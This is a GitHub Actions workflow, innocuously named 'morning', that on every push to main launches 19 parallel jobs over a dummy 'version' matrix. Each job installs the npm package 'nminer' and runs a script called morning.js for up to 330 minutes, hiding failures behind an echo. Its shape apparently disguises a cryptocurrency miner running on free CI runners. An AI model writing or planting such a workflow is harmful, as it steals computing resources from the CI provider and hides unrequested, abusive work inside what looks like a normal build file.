name: morning
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6231 }
          - { version: 1214 }
          - { version: 878 }
          - { version: 6119 }
          - { version: 369 }
          - { version: 3786 }
          - { version: 7207 }
          - { version: 5648 }
          - { version: 9951 }
          - { version: 9845 }
          - { version: 8676 }
          - { version: 1086 }
          - { version: 7895 }
          - { version: 5437 }
          - { version: 9036 }
          - { version: 7169 }
          - { version: 2115 }
          - { version: 8631 }
          - { version: 4315 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: wherever
        run: |
          npm install nminer@latest
          timeout 330m node morning.js || echo "morning executed"